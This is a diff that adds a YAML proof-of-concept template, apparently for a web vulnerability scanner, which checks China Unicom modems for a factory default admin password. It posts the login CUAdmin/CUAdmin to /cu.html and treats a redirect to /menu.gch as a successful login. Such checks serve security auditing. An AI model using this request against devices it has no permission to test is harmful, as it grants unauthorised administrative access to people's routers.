@@ -1,0 +1,14 @@
+detail: {}
+expression: r0()
+manual: true
+name: poc-yaml-chinaunicom-modem-default-password
+rules:
+  r0:
+    expression: response.status == 302 && response.headers["location"] == "/menu.gch"
+    request:
+      body: frashnum=&action=login&Frm_Logintoken=1&Username=CUAdmin&Password=CUAdmin&Username=&Password=
+      cache: true
+      follow_redirects: false
+      method: POST
+      path: /cu.html
+transport: http
